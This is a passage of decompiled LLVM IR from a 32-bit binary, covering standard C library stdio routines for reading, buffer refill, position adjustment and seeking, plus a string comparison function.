  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_8056053 = add i32 %v0_805604f, 44
  %v2_8056053 = inttoptr i32 %v1_8056053 to i32*
  store i32 0, i32* %v2_8056053, align 4
  %v0_805605a = load i32, i32* @esi, align 4
  %v1_805605a = add i32 %v0_805605a, 2
  %v2_805605a = inttoptr i32 %v1_805605a to i8*
  store i8 0, i8* %v2_805605a, align 1
  %v0_805605e = load i32, i32* %eax.global-to-local, align 4
  %v1_805605e = and i32 %v0_805605e, -72
  store i32 %v1_805605e, i32* %eax.global-to-local, align 4
  %v1_8056061 = trunc i32 %v1_805605e to i16
  %v2_8056061 = load i32, i32* @esi, align 4
  %v3_8056061 = inttoptr i32 %v2_8056061 to i16*
  store i16 %v1_8056061, i16* %v3_8056061, align 2
  %v0_8056064 = load i32, i32* @esi, align 4
  %v1_8056064 = add i32 %v0_8056064, 8
  %v2_8056064 = inttoptr i32 %v1_8056064 to i32*
  %v3_8056064 = load i32, i32* %v2_8056064, align 4
  store i32 %v3_8056064, i32* %eax.global-to-local, align 4
  %v2_8056067 = add i32 %v0_8056064, 16
  %v3_8056067 = inttoptr i32 %v2_8056067 to i32*
  store i32 %v3_8056064, i32* %v3_8056067, align 4
  %v0_805606a = load i32, i32* %eax.global-to-local, align 4
  %v1_805606a = load i32, i32* @esi, align 4
  %v2_805606a = add i32 %v1_805606a, 20
  %v3_805606a = inttoptr i32 %v2_805606a to i32*
  store i32 %v0_805606a, i32* %v3_805606a, align 4
  %v0_805606d = load i32, i32* %eax.global-to-local, align 4
  %v1_805606d = load i32, i32* @esi, align 4
  %v2_805606d = add i32 %v1_805606d, 24
  %v3_805606d = inttoptr i32 %v2_805606d to i32*
  store i32 %v0_805606d, i32* %v3_805606d, align 4
  %v0_8056070 = load i32, i32* %eax.global-to-local, align 4
  %v1_8056070 = load i32, i32* @esi, align 4
  %v2_8056070 = add i32 %v1_8056070, 28
  %v3_8056070 = inttoptr i32 %v2_8056070 to i32*
  store i32 %v0_8056070, i32* %v3_8056070, align 4
  br label %dec_label_pc_8056078

dec_label_pc_8056075:                             ; preds = %dec_label_pc_805603b, %dec_label_pc_8056027, %dec_label_pc_8056012
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8056078

dec_label_pc_8056078:                             ; preds = %dec_label_pc_805604f, %dec_label_pc_8056075
  br i1 %v1_8055fec, label %dec_label_pc_805608d, label %dec_label_pc_805607c

dec_label_pc_805607c:                             ; preds = %dec_label_pc_8056078
  %v2_8056080 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_8056080, i32* @eax, align 4
  %v3_8056085 = call i32 @__pthread_return_void(i32 %v2_8056080, i32 1)
  store i32 %v3_8056085, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805608d

dec_label_pc_805608d:                             ; preds = %dec_label_pc_8056078, %dec_label_pc_8055fd4, %dec_label_pc_805607c
  %v0_8056090 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8056090, i32* %eax.global-to-local, align 4
  store i32 %v0_8055fb3, i32* @ebx, align 4
  store i32 %v0_8055fb2, i32* @esi, align 4
  store i32 %v0_8055fb1, i32* @edi, align 4
  store i32 %v0_8055fb0, i32* @ebp, align 4
  ret i32 %v0_8056090

; uselistorder directives
  uselistorder i32 %v2_805603d.pre-phi, { 1, 0 }
  uselistorder i32 %v0_8056022, { 1, 0 }
  uselistorder i32* %stack_var_-28, { 2, 0, 1 }
  uselistorder i32* %ebx.global-to-local, { 2, 0, 1, 3 }
  uselistorder i8 64, { 0, 3, 4, 5, 1, 2 }
  uselistorder i32 (i32)* @__pthread_return_0, { 32, 19, 18, 17, 16, 15, 14, 13, 3, 31, 34, 10, 11, 2, 1, 0, 6, 9, 5, 12, 25, 24, 23, 27, 26, 8, 22, 7, 33, 4, 21, 20, 30, 29, 28 }
  uselistorder i32 (i32, i32)* @__pthread_return_void, { 56, 55, 52, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 1, 0, 54, 53, 61, 60, 59, 12, 14, 13, 5, 4, 11, 10, 3, 2, 16, 15, 41, 40, 39, 38, 37, 36, 45, 44, 43, 42, 9, 8, 35, 34, 7, 6, 58, 57, 33, 32, 31, 30, 51, 50, 49, 48, 47, 46 }
  uselistorder i32 134562299, { 2, 3, 28, 29, 30, 31, 32, 33, 0, 4, 5, 6, 7, 8, 9, 10, 11, 12, 1, 21, 22, 23, 13, 24, 14, 15, 16, 17, 18, 25, 26, 27, 19, 20 }
  uselistorder i32 52, { 9, 1, 14, 2, 3, 4, 5, 15, 16, 6, 12, 7, 10, 8, 17, 13, 11, 0 }
  uselistorder i32 22, { 8, 15, 3, 4, 5, 6, 11, 14, 13, 9, 10, 12, 16, 7, 1, 2, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805608d, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8056078, { 1, 0 }
  uselistorder label %dec_label_pc_805603b, { 1, 0 }
  uselistorder label %dec_label_pc_805600d, { 1, 0 }
}

define i32 @__stdio_READ(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8056098 = load i32, i32* @ebx, align 4
  store i32 %v0_8056098, i32* %stack_var_-4, align 4
  store i32 0, i32* %ecx.global-to-local, align 4
  %v4_805609e = ptrtoint i16* %arg1 to i32
  store i32 %v4_805609e, i32* @ebx, align 4
  %v1_80560a6 = bitcast i16* %arg1 to i8*
  %v2_80560a6 = load i8, i8* %v1_80560a6, align 1
  %v3_80560a6 = and i8 %v2_80560a6, 4
  %v4_80560a6 = icmp eq i8 %v3_80560a6, 0
  %v1_80560a9 = icmp eq i1 %v4_80560a6, false
  br i1 %v1_80560a9, label %dec_label_pc_80560e1, label %dec_label_pc_80560ab

dec_label_pc_80560ab:                             ; preds = %entry
  %v2_80560ab = icmp slt i32 %arg3, 0
  %v3_80560b2 = select i1 %v2_80560ab, i32 2147483647, i32 %arg3
  %v1_80560bb = add i32 %v4_805609e, 4
  %v2_80560bb = inttoptr i32 %v1_80560bb to i32*
  %v3_80560bb = load i32, i32* %v2_80560bb, align 4
  %v3_80560be = inttoptr i32 %arg2 to i32*
  %v4_80560be = call i32 @__libc_read(i32 %v3_80560bb, i32* %v3_80560be, i32 %v3_80560b2)
  store i32 %v4_80560be, i32* %ecx.global-to-local, align 4
  %tmp11 = icmp slt i32 %v4_80560be, 1
  %tmp12 = icmp eq i1 %tmp11, false
  br i1 %tmp12, label %dec_label_pc_80560e1, label %dec_label_pc_80560cd

dec_label_pc_80560cd:                             ; preds = %dec_label_pc_80560ab
  %v1_80560c6 = icmp eq i32 %v4_80560be, 0
  %v4_80560cb = icmp eq i1 %v1_80560c6, false
  %v0_80560cd = load i32, i32* @ebx, align 4
  %v1_80560cd = inttoptr i32 %v0_80560cd to i32*
  %v2_80560cd = load i32, i32* %v1_80560cd, align 4
  br i1 %v4_80560cb, label %dec_label_pc_80560d9, label %dec_label_pc_80560d1

dec_label_pc_80560d1:                             ; preds = %dec_label_pc_80560cd
  %v1_80560d1 = or i32 %v2_80560cd, 4
  %v1_80560d4 = trunc i32 %v1_80560d1 to i16
  %v3_80560d4 = inttoptr i32 %v0_80560cd to i16*
  store i16 %v1_80560d4, i16* %v3_80560d4, align 2
  br label %dec_label_pc_80560e1

dec_label_pc_80560d9:                             ; preds = %dec_label_pc_80560cd
  %v1_80560d9 = or i32 %v2_80560cd, 8
  store i32 0, i32* %ecx.global-to-local, align 4
  %v1_80560de = trunc i32 %v1_80560d9 to i16
  %v3_80560de = inttoptr i32 %v0_80560cd to i16*
  store i16 %v1_80560de, i16* %v3_80560de, align 2
  br label %dec_label_pc_80560e1

dec_label_pc_80560e1:                             ; preds = %dec_label_pc_80560ab, %entry, %dec_label_pc_80560d1, %dec_label_pc_80560d9
  %v0_80560e2 = load i32, i32* %ecx.global-to-local, align 4
  %v2_80560e5 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80560e5, i32* @ebx, align 4
  ret i32 %v0_80560e2

; uselistorder directives
  uselistorder i32 %v4_80560be, { 2, 0, 1 }
  uselistorder i32* %ecx.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32 2147483647, { 2, 0, 1, 3 }
  uselistorder i16* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80560e1, { 3, 2, 0, 1 }
}

define i32 @__stdio_adjust_position(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %v4_80560f0 = ptrtoint i16* %arg1 to i32
  store i32 %v4_80560f0, i32* %ebx.global-to-local, align 4
  store i32 %arg2, i32* %edi.global-to-local, align 4
  %v2_80560f8 = load i16, i16* %arg1, align 2
  %v3_80560f8 = zext i16 %v2_80560f8 to i32
  store i32 %v3_80560f8, i32* %ecx.global-to-local, align 4
  %tmp = urem i16 %v2_80560f8, 4
  %v1_80560fd = zext i16 %tmp to i32
  %v2_80560fd = icmp eq i16 %tmp, 0
  br i1 %v2_80560fd, label %dec_label_pc_805612c, label %dec_label_pc_8056102

dec_label_pc_8056102:                             ; preds = %entry
  %v1_8056104 = add nsw i32 %v1_80560fd, -1
  %v8_8056104 = icmp eq i32 %v1_8056104, 0
  store i32 %v1_8056104, i32* @edx, align 4
  br i1 %v8_8056104, label %dec_label_pc_805612c, label %dec_label_pc_8056107

dec_label_pc_8056107:                             ; preds = %dec_label_pc_8056102
  %v3_8056107 = and i32 %v3_80560f8, 2048
  %v4_8056107 = icmp eq i32 %v3_8056107, 0
  br i1 %v4_8056107, label %dec_label_pc_805612c, label %dec_label_pc_805610c

dec_label_pc_805610c:                             ; preds = %dec_label_pc_8056107
  %v6_805610c = sub nsw i32 1, %v1_80560fd
  %v7_805610c = and i32 %v1_8056104, %v6_805610c
  %v8_805610c = icmp slt i32 %v7_805610c, 0
  %v9_805610c = icmp eq i16 %tmp, 2
  %v10_805610c = icmp ult i16 %tmp, 2
  %v3_805610f = icmp eq i1 %v10_805610c, %v8_805610c
  %v4_805610f = icmp eq i1 %v9_805610c, false
  %v5_805610f = and i1 %v4_805610f, %v3_805610f
  br i1 %v5_805610f, label %dec_label_pc_8056180, label %dec_label_pc_8056111

dec_label_pc_8056111:                             ; preds = %dec_label_pc_805610c
  %v1_8056111 = add i32 %v4_80560f0, 40
  %v2_8056111 = inttoptr i32 %v1_8056111 to i32*
  %v3_8056111 = load i32, i32* %v2_8056111, align 4
  %v4_8056111 = icmp eq i32 %v3_8056111, 0
  %v1_8056115 = icmp eq i1 %v4_8056111, false
  br i1 %v1_8056115, label %dec_label_pc_8056180, label %dec_label_pc_8056117

dec_label_pc_8056117:                             ; preds = %dec_label_pc_8056111
  %v1_8056117 = add i32 %v4_80560f0, 3
  %v2_8056117 = inttoptr i32 %v1_8056117 to i8*
  %v3_8056117 = load i8, i8* %v2_8056117, align 1
  %v4_8056117 = zext i8 %v3_8056117 to i32
  %v2_805611b = sub nsw i32 %v1_8056104, %v4_8056117
  %v1_805611d = add i32 %v4_80560f0, 44
  %v2_805611d = inttoptr i32 %v1_805611d to i32*
  %v3_805611d = load i32, i32* %v2_805611d, align 4
  %v1_8056121 = add nsw i32 %v2_805611b, -1
  %tmp11 = icmp slt i32 %v3_805611d, 1
  br i1 %tmp11, label %dec_label_pc_805612c, label %dec_label_pc_8056126

dec_label_pc_8056126:                             ; preds = %dec_label_pc_8056117
  %v1_8056126 = add i32 %v4_80560f0, 2
  %v2_8056126 = inttoptr i32 %v1_8056126 to i8*
  %v3_8056126 = load i8, i8* %v2_8056126, align 1
  %v4_8056126 = zext i8 %v3_8056126 to i32
  %v2_805612a = sub nsw i32 %v1_8056121, %v4_8056126
  br label %dec_label_pc_805612c

dec_label_pc_805612c:                             ; preds = %dec_label_pc_8056117, %dec_label_pc_8056107, %dec_label_pc_8056102, %entry, %dec_label_pc_8056126
  %v0_8056141 = phi i32 [ %v1_8056121, %dec_label_pc_8056117 ], [ %v1_8056104, %dec_label_pc_8056107 ], [ 0, %dec_label_pc_8056102 ], [ 0, %entry ], [ %v2_805612a, %dec_label_pc_8056126 ]
  %v2_805612c = and i32 %v3_80560f8, 64
  %v3_805612c = icmp eq i32 %v2_805612c, 0
  %storemerge.in.in.v = select i1 %v3_805612c, i32 20, i32 8
  %storemerge.in.in = add i32 %storemerge.in.in.v, %v4_80560f0
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v2_8056139 = add i32 %v4_80560f0, 16
  %v3_8056139 = inttoptr i32 %v2_8056139 to i32*
  %v4_8056139 = load i32, i32* %v3_8056139, align 4
  %v5_8056139 = sub i32 %storemerge, %v4_8056139
  %v1_805613c = inttoptr i32 %arg2 to i32*
  %v2_805613c = load i32, i32* %v1_805613c, align 4
  store i32 %v2_805613c, i32* %ecx.global-to-local, align 4
  %v1_805613e = add i32 %arg2, 4
  %v2_805613e = inttoptr i32 %v1_805613e to i32*
  %v3_805613e = load i32, i32* %v2_805613e, align 4
  store i32 %v3_805613e, i32* %ebx.global-to-local, align 4
  %v2_8056141 = add i32 %v5_8056139, %v0_8056141
  store i32 %v2_8056141, i32* %esi.global-to-local, align 4
  %v5_8056155 = sub i32 %v2_805613c, %v2_8056141
  %v10_8056155 = icmp ult i32 %v2_805613c, %v2_8056141
  %v6_8056159 = zext i1 %v10_8056155 to i32
  %tmp13 = icmp slt i32 %v2_8056141, 0
  %v2_8056146.neg = zext i1 %tmp13 to i32
  %v7_8056159 = add i32 %v3_805613e, %v2_8056146.neg
  %v8_8056159 = add i32 %v7_8056159, %v6_8056159
  store i32 %v8_8056159, i32* @edx, align 4
  store i32 %v5_8056155, i32* %v1_805613c, align 4
  %v0_805615f = load i32, i32* @edx, align 4
  %v1_805615f = load i32, i32* %edi.global-to-local, align 4
  %v2_805615f = add i32 %v1_805615f, 4
  %v3_805615f = inttoptr i32 %v2_805615f to i32*
  store i32 %v0_805615f, i32* %v3_805615f, align 4
  %v0_8056162 = load i32, i32* %edi.global-to-local, align 4
  %v1_8056162 = add i32 %v0_8056162, 4
  %v2_8056162 = inttoptr i32 %v1_8056162 to i32*
  %v3_8056162 = load i32, i32* %v2_8056162, align 4
  %v4_8056162 = load i32, i32* %ebx.global-to-local, align 4
  %v5_8056165 = icmp slt i32 %v3_8056162, %v4_8056162
  br i1 %v5_8056165, label %dec_label_pc_805616f, label %dec_label_pc_8056167

dec_label_pc_8056167:                             ; preds = %dec_label_pc_805612c
  %v8_8056167 = icmp sgt i32 %v3_8056162, %v4_8056162
  br i1 %v8_8056167, label %dec_label_pc_805616d, label %dec_label_pc_8056169

dec_label_pc_8056169:                             ; preds = %dec_label_pc_8056167
  %v1_8056169 = inttoptr i32 %v0_8056162 to i32*
  %v2_8056169 = load i32, i32* %v1_8056169, align 4
  %v3_8056169 = load i32, i32* %ecx.global-to-local, align 4
  %tmp14 = icmp ugt i32 %v2_8056169, %v3_8056169
  br i1 %tmp14, label %dec_label_pc_805616d, label %dec_label_pc_805616f

dec_label_pc_805616d:                             ; preds = %dec_label_pc_8056169, %dec_label_pc_8056167
  %v0_805616d = load i32, i32* %esi.global-to-local, align 4
  %v1_805616d = sub i32 0, %v0_805616d
  store i32 %v1_805616d, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805616f

dec_label_pc_805616f:                             ; preds = %dec_label_pc_8056169, %dec_label_pc_805612c, %dec_label_pc_805616d
  %v0_805616f = load i32, i32* %esi.global-to-local, align 4
  %v2_805616f = icmp slt i32 %v0_805616f, 0
  %v1_8056171 = icmp eq i1 %v2_805616f, false
  br i1 %v1_8056171, label %dec_label_pc_8056183, label %dec_label_pc_8056173

dec_label_pc_8056173:                             ; preds = %dec_label_pc_805616f
  %v1_8056173 = call i32 @__errno_location(i32 %v2_8056141)
  %v1_8056178 = inttoptr i32 %v1_8056173 to i32*
  store i32 75, i32* %v1_8056178, align 4
  %v0_8056186.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8056183

dec_label_pc_8056180:                             ; preds = %dec_label_pc_8056111, %dec_label_pc_805610c
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8056183

dec_label_pc_8056183:                             ; preds = %dec_label_pc_805616f, %dec_label_pc_8056173, %dec_label_pc_8056180
  %v0_8056186 = phi i32 [ %v0_805616f, %dec_label_pc_805616f ], [ %v0_8056186.pre, %dec_label_pc_8056173 ], [ -1, %dec_label_pc_8056180 ]
  ret i32 %v0_8056186

; uselistorder directives
  uselistorder i32 %v4_8056162, { 1, 0 }
  uselistorder i32 %v3_8056162, { 1, 0 }
  uselistorder i32 %v2_8056141, { 3, 0, 2, 1, 4 }
  uselistorder i32 %v1_8056104, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v4_80560f0, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32* %esi.global-to-local, { 0, 2, 3, 1, 4, 5 }
  uselistorder i32 75, { 2, 1, 0 }
  uselistorder i16 2, { 0, 1, 4, 2, 3 }
  uselistorder i32 2048, { 3, 0, 4, 1, 2, 7, 8, 5, 6 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i16* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8056183, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805616f, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805612c, { 4, 0, 1, 2, 3 }
}

define i32 @__stdio_rfill(i32 %arg1) local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %v0_805618c = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_8056194 = add i32 %arg1, 8
  %v2_8056194 = inttoptr i32 %v1_8056194 to i32*
  %v3_8056194 = load i32, i32* %v2_8056194, align 4
  store i32 %v3_8056194, i32* %edx.global-to-local, align 4
  %v1_8056197 = add i32 %arg1, 12
  %v2_8056197 = inttoptr i32 %v1_8056197 to i32*
  %v3_8056197 = load i32, i32* %v2_8056197, align 4
  %v2_805619a = sub i32 %v3_8056197, %v3_8056194
  %v3_805619f = inttoptr i32 %arg1 to i16*
  %v4_805619f = call i32 @__stdio_READ(i16* %v3_805619f, i32 %v3_8056194, i32 %v2_805619a)
  %v0_80561a4 = load i32, i32* @ebx, align 4
  %v1_80561a4 = add i32 %v0_80561a4, 8
  %v2_80561a4 = inttoptr i32 %v1_80561a4 to i32*
  %v3_80561a4 = load i32, i32* %v2_80561a4, align 4
  store i32 %v3_80561a4, i32* %edx.global-to-local, align 4
  %v2_80561a7 = add i32 %v0_80561a4, 16
  %v3_80561a7 = inttoptr i32 %v2_80561a7 to i32*
  store i32 %v3_80561a4, i32* %v3_80561a7, align 4
  %v0_80561aa = load i32, i32* %edx.global-to-local, align 4
  %v2_80561aa = add i32 %v0_80561aa, %v4_805619f
  store i32 %v2_80561aa, i32* %edx.global-to-local, align 4
  %v1_80561ac = load i32, i32* @ebx, align 4
  %v2_80561ac = add i32 %v1_80561ac, 20
  %v3_80561ac = inttoptr i32 %v2_80561ac to i32*
  store i32 %v2_80561aa, i32* %v3_80561ac, align 4
  store i32 %v0_805618c, i32* @ebx, align 4
  ret i32 %v4_805619f

; uselistorder directives
  uselistorder i32 %v4_805619f, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
}

define i32 @__stdio_trans2r_o(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_80561b4 = load i32, i32* @ebx, align 4
  %v4_80561b8 = ptrtoint i16* %arg1 to i32
  store i32 %v4_80561b8, i32* @ebx, align 4
  %v2_80561c0 = load i16, i16* %arg1, align 2
  %v3_80561c0 = zext i16 %v2_80561c0 to i32
  %v2_80561c3 = and i32 %v3_80561c0, %arg2
  %v3_80561c3 = icmp eq i32 %v2_80561c3, 0
  %v1_80561c5 = icmp eq i1 %v3_80561c3, false
  br i1 %v1_80561c5, label %dec_label_pc_80561d3, label %dec_label_pc_80561c7

dec_label_pc_80561c7:                             ; preds = %entry
  %v1_80561c7 = and i32 %v3_80561c0, 2176
  %v2_80561c7 = icmp eq i32 %v1_80561c7, 0
  %v1_80561cc = icmp eq i1 %v2_80561c7, false
  br i1 %v1_80561cc, label %dec_label_pc_80561da, label %dec_label_pc_80561ce

dec_label_pc_80561ce:                             ; preds = %dec_label_pc_80561c7
  %v2_80561ce = or i32 %v3_80561c0, %arg2
  %v1_80561d0 = trunc i32 %v2_80561ce to i16
  store i16 %v1_80561d0, i16* %arg1, align 2
  %v0_80561d3.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80561d3

dec_label_pc_80561d3:                             ; preds = %entry, %dec_label_pc_80561ce
  %v0_80561f9 = phi i32 [ %v4_80561b8, %entry ], [ %v0_80561d3.pre, %dec_label_pc_80561ce ]
  %v1_80561d3 = inttoptr i32 %v0_80561f9 to i16*
  %v2_80561d3 = load i16, i16* %v1_80561d3, align 2
  %v2_80561d6 = and i16 %v2_80561d3, 16
  %v3_80561d6 = icmp eq i16 %v2_80561d6, 0
  br i1 %v3_80561d6, label %dec_label_pc_80561f2, label %dec_label_pc_80561da

dec_label_pc_80561da:                             ; preds = %dec_label_pc_80561d3, %dec_label_pc_80561c7
  %v1_80561da = call i32 @__errno_location(i32 %v0_80561b4)
  %v1_80561df = inttoptr i32 %v1_80561da to i32*
  store i32 9, i32* %v1_80561df, align 4
  br label %dec_label_pc_80561e5

dec_label_pc_80561e5:                             ; preds = %dec_label_pc_80561f6, %dec_label_pc_80561da
  %v0_80561e5 = load i32, i32* @ebx, align 4
  %v1_80561e5 = inttoptr i32 %v0_80561e5 to i32*
  %v2_80561e5 = load i32, i32* %v1_80561e5, align 4
  %v1_80561e7 = or i32 %v2_80561e5, 8
  %v1_80561ea = trunc i32 %v1_80561e7 to i16
  %v3_80561ea = inttoptr i32 %v0_80561e5 to i16*
  store i16 %v1_80561ea, i16* %v3_80561ea, align 2
  br label %dec_label_pc_805621e

dec_label_pc_80561f2:                             ; preds = %dec_label_pc_80561d3
  %v2_80561f2 = and i16 %v2_80561d3, 64
  %v3_80561f2 = icmp eq i16 %v2_80561f2, 0
  br i1 %v3_80561f2, label %dec_label_pc_8056214, label %dec_label_pc_80561f6

dec_label_pc_80561f6:                             ; preds = %dec_label_pc_80561f2
  %v2_80561fa = call i32 @__stdio_wcommit(i32 %v0_80561f9)
  %v1_8056202 = icmp eq i32 %v2_80561fa, 0
  %v1_8056204 = icmp eq i1 %v1_8056202, false
  br i1 %v1_8056204, label %dec_label_pc_80561e5, label %dec_label_pc_8056206

dec_label_pc_8056206:                             ; preds = %dec_label_pc_80561f6
  %v0_8056206 = load i32, i32* @ebx, align 4
  %v1_8056206 = add i32 %v0_8056206, 8
  %v2_8056206 = inttoptr i32 %v1_8056206 to i32*
  %v3_8056206 = load i32, i32* %v2_8056206, align 4
  %v2_8056209 = add i32 %v0_8056206, 28
  %v3_8056209 = inttoptr i32 %v2_8056209 to i32*
  store i32 %v3_8056206, i32* %v3_8056209, align 4
  %v0_805620c = load i32, i32* @ebx, align 4
  %v1_805620c = inttoptr i32 %v0_805620c to i32*
  %v2_805620c = load i32, i32* %v1_805620c, align 4
  %v2_805620c.tr = trunc i32 %v2_805620c to i16
  %v1_8056211 = and i16 %v2_805620c.tr, -65
  %v3_8056211 = inttoptr i32 %v0_805620c to i16*
  store i16 %v1_8056211, i16* %v3_8056211, align 2
  %v0_8056214.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8056214

dec_label_pc_8056214:                             ; preds = %dec_label_pc_80561f2, %dec_label_pc_8056206
  %v2_8056219 = phi i32 [ %v0_80561f9, %dec_label_pc_80561f2 ], [ %v0_8056214.pre, %dec_label_pc_8056206 ]
  %v1_8056214 = inttoptr i32 %v2_8056219 to i32*
  %v2_8056214 = load i32, i32* %v1_8056214, align 4
  %v1_8056216 = or i32 %v2_8056214, 1
  %v1_8056219 = trunc i32 %v1_8056216 to i16
  %v3_8056219 = inttoptr i32 %v2_8056219 to i16*
  store i16 %v1_8056219, i16* %v3_8056219, align 2
  br label %dec_label_pc_805621e

dec_label_pc_805621e:                             ; preds = %dec_label_pc_80561e5, %dec_label_pc_8056214
  %storemerge = phi i32 [ 0, %dec_label_pc_8056214 ], [ -1, %dec_label_pc_80561e5 ]
  %v2_805621e = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805621e, i32* @edx, align 4
  store i32 %v0_80561b4, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v3_80561c0, { 0, 2, 1 }
  uselistorder i32 %v0_80561b4, { 1, 0 }
  uselistorder i32 (i32)* @__stdio_wcommit, { 3, 6, 5, 4, 2, 1, 0 }
  uselistorder i16 0, { 0, 8, 2, 1, 9, 6, 10, 7, 11, 12, 13, 14, 15, 16, 17, 3, 4, 5 }
  uselistorder i32 2176, { 1, 0 }
  uselistorder i16* %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_805621e, { 1, 0 }
  uselistorder label %dec_label_pc_8056214, { 1, 0 }
  uselistorder label %dec_label_pc_80561d3, { 1, 0 }
}

define i32 @__stdio_seek(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %tmp5 = ptrtoint i32* %arg2 to i32
  store i32 %tmp5, i32* @ebx, align 4
  %v1_8056230 = add i32 %tmp5, 4
  %v2_8056230 = inttoptr i32 %v1_8056230 to i32*
  %v3_8056230 = load i32, i32* %v2_8056230, align 4
  %v2_8056233 = load i32, i32* %arg2, align 4
  %v1_8056239 = add i32 %arg1, 4
  %v2_8056239 = inttoptr i32 %v1_8056239 to i32*
  %v3_8056239 = load i32, i32* %v2_8056239, align 4
  %v4_805623c = call i32 @__libc_lseek64(i32 %v3_8056239, i32 %v2_8056233, i32 %v3_8056230, i32 %arg3)
  %v0_8056244 = load i32, i32* @edx, align 4
  %v2_8056244 = icmp slt i32 %v0_8056244, 0
  store i32 %v4_805623c, i32* %ecx.global-to-local, align 4
  br i1 %v2_8056244, label %dec_label_pc_8056251, label %dec_label_pc_805624a

dec_label_pc_805624a:                             ; preds = %entry
  %v1_805624a = load i32, i32* @ebx, align 4
  %v2_805624a = inttoptr i32 %v1_805624a to i32*
  store i32 %v4_805623c, i32* %v2_805624a, align 4
  store i32 0, i32* %ecx.global-to-local, align 4
  %v0_805624e = load i32, i32* @edx, align 4
  %v1_805624e = load i32, i32* @ebx, align 4
  %v2_805624e = add i32 %v1_805624e, 4
  %v3_805624e = inttoptr i32 %v2_805624e to i32*
  store i32 %v0_805624e, i32* %v3_805624e, align 4
  %v0_8056252.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8056251

dec_label_pc_8056251:                             ; preds = %entry, %dec_label_pc_805624a
  %v0_8056252 = phi i32 [ %v4_805623c, %entry ], [ %v0_8056252.pre, %dec_label_pc_805624a ]
  ret i32 %v0_8056252

; uselistorder directives
  uselistorder i32 %tmp5, { 1, 0 }
  uselistorder label %dec_label_pc_8056251, { 1, 0 }
}

define i32 @__GI_strcoll(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v4_805625a = ptrtoint i8* %arg1 to i32
  %v4_8056262.pre = load i32, i32* @eax, align 4
  %v8_8056262.pre = load i1, i1* @df, align 1
  %v9_8056262 = select i1 %v8_8056262.pre, i32 -1, i32 1
  br label %dec_label_pc_8056262

dec_label_pc_8056262:                             ; preds = %dec_label_pc_8056266, %entry
  %v20_8056263 = phi i32 [ %v23_8056263, %dec_label_pc_8056266 ], [ %arg2, %entry ]
  %v4_8056262 = phi i32 [ %v6_8056262, %dec_label_pc_8056266 ], [ %v4_8056262.pre, %entry ]
  %v7_8056262 = phi i32 [ %v10_8056262, %dec_label_pc_8056266 ], [ %v4_805625a, %entry ]
  %v1_8056262 = inttoptr i32 %v7_8056262 to i8*
  %v2_8056262 = load i8, i8* %v1_8056262, align 1
  %v3_8056263 = inttoptr i32 %v20_8056263 to i8*
  %v4_8056263 = load i8, i8* %v3_8056263, align 1
  %v15_8056263 = icmp eq i8 %v2_8056262, %v4_8056263
  %v1_8056264 = icmp eq i1 %v15_8056263, false
  br i1 %v1_8056264, label %dec_label_pc_805626e, label %dec_label_pc_8056266

dec_label_pc_8056266:                             ; preds = %dec_label_pc_8056262
  %v3_8056262 = zext i8 %v2_8056262 to i32
  %v5_8056262 = and i32 %v4_8056262, -256
  %v6_8056262 = or i32 %v3_8056262, %v5_8056262
  %v23_8056263 = add i32 %v20_8056263, %v9_8056262
  %v10_8056262 = add i32 %v7_8056262, %v9_8056262
  %v4_8056266 = icmp eq i8 %v2_8056262, 0
  %v1_8056268 = icmp eq i1 %v4_8056266, false
  br i1 %v1_8056268, label %dec_label_pc_8056262, label %dec_label_pc_8056272

dec_label_pc_805626e:                             ; preds = %dec_label_pc_8056262
  br label %dec_label_pc_8056272

dec_label_pc_8056272:                             ; preds = %dec_label_pc_8056266, %dec_label_pc_805626e
  %storemerge = phi i32 [ 1, %dec_label_pc_805626e ], [ 0, %dec_label_pc_8056266 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8 %v2_8056262, { 1, 2, 0 }
  uselistorder i32 %v9_8056262, { 1, 0 }
  uselistorder label %dec_label_pc_8056272, { 1, 0 }
}

